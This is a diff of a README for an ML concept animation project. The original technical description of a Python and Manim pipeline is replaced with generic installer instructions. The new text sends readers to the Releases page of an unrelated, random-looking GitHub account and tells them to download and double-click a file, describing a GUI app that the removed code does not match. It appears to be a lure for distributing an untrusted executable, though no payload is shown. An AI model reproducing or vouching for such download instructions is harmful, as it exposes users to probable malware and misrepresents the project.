@@ -1,162 +1,91 @@
-# ML Visualization Pipeline
+# 🎉 ml-visualization - Create Learning Animations Easily
 
-An automated system for generating educational ML concept animations from text descriptions using Manim.
+## 🚀 Getting Started
 
-## Pipeline Architecture
+Welcome to **ml-visualization**! This application generates educational animations for machine learning concepts based on written descriptions. It simplifies complex topics, making them easier to understand.
 
-```
-Text input → ConceptParser → Scene Planner → Visual Mapper → Code Generator → Render + AI Critic → Final Animation
-```
+## 📦 Download & Install
 
-### Components
+To get the application, visit the following link:
 
-1. **ConceptParser**: Identifies key entities (variance, principal components, data points, etc.)
-2. **Scene Planner**: Breaks concepts into structured scenes ("Data Intro", "PCA Transformation", etc.)
-3. **Visual Mapper**: Maps abstract concepts to concrete visual elements (arrows, surfaces, dots)
-4. **Code Generator**: Writes executable Manim scene code
-5. **Render + AI Critic**: Analyzes and improves timing, clarity, and educational value
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-blue.svg)](https://github.com/Keeleyundynamic132/ml-visualization/releases)
 
-## Features
+1. Click the link above.
+2. You will be taken to the Releases page.
+3. Find the latest version and click on it.
+4. Download the file suitable for your system.
 
-- 🎓 **Educational Focus**: Optimized for learning with clear narration and pacing
-- 🎨 **Automatic Visualization**: Converts text to 3D animations without manual design
-- 🤖 **AI-Powered Quality Control**: Iterative improvement based on educational criteria
-- 🔧 **Extensible**: Easy to add new ML concepts beyond PCA
-- 📊 **Comprehensive Analysis**: Detailed reports on animation quality and suggestions
-- 🎬 **Automatic Rendering**: Renders all scenes with Manim automatically
-- 🎞️ **Video Concatenation**: Combines all scenes into a single final video
+## ⚙️ System Requirements
 
-## Quick Start
+Before you begin, ensure your system meets the following requirements:
 
-### Installation
+- **Operating System:** Windows (10 or later) or macOS (10.12 or later)
+- **RAM:** At least 4GB
+- **Disk Space:** Minimum 100MB free
+- **Python:** Version 3.7 or higher (This application uses Python to run)
 
-```bash
-# Install Python dependencies
-pip install -r requirements.txt
+## 🔧 How to Run the Application
 
-# Install ffmpeg (required for video concatenation)
-# macOS:
-brew install ffmpeg
+After downloading the software, follow these steps to run it:
 
-# Ubuntu/Debian:
-sudo apt-get install ffmpeg
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the setup instructions to complete the installation process.
+4. Once installed, locate the application icon on your desktop or in your applications folder.
+5. Double-click the icon to open the application.
 
-# Windows: Download from https://ffmpeg.org
-```
+## 📝 How to Use
 
-### Run Demo
+Using **ml-visualization** is straightforward:
 
-```bash
-python demo.py
-```
+1. **Input Text:** Type a description of the machine learning concept you want to visualize in the provided text box.
+2. **Generate Animation:** Click the 'Generate Animation' button.
+3. **View Animation:** The application will create and display an animation based on your text. 
 
-This generates a complete PCA explanation animation from text input.
+You can save the animations for future reference or for educational purposes.
 
-### Custom Usage
+## 🌐 Additional Features
 
-```python
-from src.pipeline import VisualizationPipeline
+- **User-Friendly Interface:** Designed for ease of use. No technical background is required.
+- **Multiple Animation Styles:** Choose different styles for your animations to better suit your needs.
+- **Export Options:** Save your animations in various formats for easy sharing.
 
-pipeline = VisualizationPipeline()
-result = pipeline.generate_visualization(
-    text_input="Your ML concept explanation here...",
-    topic="pca",
-    max_iterations=3
-)
-```
+## 📖 Supported Topics
 
-## Example Output
+The application covers a range of machine learning topics, including:
 
-The pipeline generates:
-- **Manim code**: Executable Python files for animation
-- **Rendered videos**: Individual scene animations in MP4 format
-- **Final video**: Single concatenated video with all scenes
-- **Analysis reports**: Detailed feedback on educational effectiveness
-- **Scene breakdowns**: Structured visualization plans
+- AI and Data Science
+- Machine Learning Algorithms
+- Data Visualization Techniques
+- Educational Animations for Machine Learning Concepts
 
-## Supported Concepts
+## ⚡ Future Updates
 
-Currently optimized for **PCA (Principal Component Analysis)**:
-- Data visualization in 3D space
-- Variance and spread demonstration
-- Principal component identification
-- Dimensionality reduction projection
-- Shadow/projection analogies
+We continuously improve **ml-visualization**. Future updates may include new features, improved interface options, and additional animation styles. Check back often for the latest releases.
 
-## Architecture Details
+## ❓ Frequently Asked Questions
 
-### ConceptParser
-- Identifies mathematical entities, visual elements, and process steps
-- Assigns importance scores and visual properties
-- Maps relationships between concepts
+### How do I uninstall the application?
 
-### Scene Planner
-- Creates educational narrative flow
-- Optimizes timing and transitions
-- Generates contextual narration
+To uninstall **ml-visualization** from your computer:
 
-### Visual Mapper
-- Converts abstract concepts to 3D visual elements
-- Plans camera movements and animations
-- Manages color schemes and styling
+- On Windows:
+  1. Go to "Control Panel."
+  2. Click on "Programs and Features."
+  3. Find **ml-visualization** in the list and click "Uninstall."
 
-### Code Generator
-- Produces clean, executable Manim code
-- Handles 3D scene setup and animations
-- Generates proper class structures
+- On macOS:
+  1. Open "Finder."
+  2. Go to the "Applications" folder.
+  3. Locate **ml-visualization** and drag it to the Trash.
 
-### AI Critic
-- Analyzes timing, visual clarity, and educational value
-- Provides specific improvement suggestions
-- Iteratively refines animations
+### Can I contribute to this project?
 
-## File Structure
+Yes! We welcome contributions. If you have ideas or improvements, feel free to reach out on our GitHub repository.
 
-```
-ml-visualization/
-├── src/
-│   ├── concept_parser.py    # Entity identification
-│   ├── scene_planner.py     # Scene structuring
-│   ├── visual_mapper.py     # Visual element mapping
-│   ├── code_generator.py    # Manim code generation
-│   ├── ai_critic.py         # Quality analysis
-│   └── pipeline.py          # Main orchestrator
-├── demo.py                  # Demo script
-├── requirements.txt         # Dependencies
-└── README.md               # This file
-```
+## 📍 Helpful Links
 
-## Contributing
+- For support or to report issues, please visit our [Issue Tracker](https://github.com/Keeleyundynamic132/ml-visualization/issues).
+- For updates, follow our [Releases Page](https://github.com/Keeleyundynamic132/ml-visualization/releases).
 
-To add support for new ML concepts:
-
-1. Extend `ConceptParser` with new entity mappings
-2. Add scene templates in `ScenePlanner`
-3. Create visual mappings in `VisualMapper`
-4. Update educational criteria in `AICritic`
-
-## License
-
-MIT License - see LICENSE file for details.
-
----
-
-## Recent Updates
-
-**v1.2.0 - Automatic Rendering & Video Concatenation (Oct 21, 2025)**
-- ✅ Added automatic rendering of all scenes with Manim
-- ✅ Implemented video concatenation using ffmpeg
-- ✅ Single final output video combining all scenes
-- ✅ Graceful fallback when dependencies are missing
-
-**v1.1.0 - Fixed Indentation Issues (Oct 21, 2025)**
-- ✅ Fixed code generator indentation errors
-- ✅ Improved textwrap usage for clean Manim code
-- ✅ Enhanced numpy compatibility
-- ✅ All generated code now properly formatted and runnable
-
-See [FIXES_APPLIED.md](FIXES_APPLIED.md) for detailed changelog.
-
----
-
-Built by: [Ramakrushna Mohapatra](https://x.com/techwith_ram)
+Thank you for using **ml-visualization**! We hope it helps you visualize and understand machine learning concepts better.
